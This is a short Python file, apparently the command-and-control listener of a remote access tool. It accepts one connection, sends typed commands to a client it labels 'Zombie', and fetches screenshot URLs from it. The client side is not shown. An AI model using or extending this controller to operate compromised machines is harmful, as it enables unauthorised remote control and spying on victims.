# server.py
import socket

HOST = '127.0.0.1'
PORT = 9999

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"[*] Listening on {HOST}:{PORT}...")

    conn, addr = server_socket.accept()
    print(f"[+] Connection from {addr}")

    try:
        while True:
            command = input("Enter command: ")

            if command.lower() == "exit":
                conn.sendall(b"exit")
                print("[*] Closing connection...")
                break

            conn.sendall(command.encode())

            if command.lower() == "screenshot":
                image_url = conn.recv(4096).decode()
                print(f"[+] Screenshot available at: {image_url}")

            else:
                result = conn.recv(4096).decode()
                print(f"[Zombie] {result}")

    except Exception as e:
        print(f"[!] Error: {e}")

    finally:
        conn.close()
        server_socket.close()

if __name__ == "__main__":
    main()
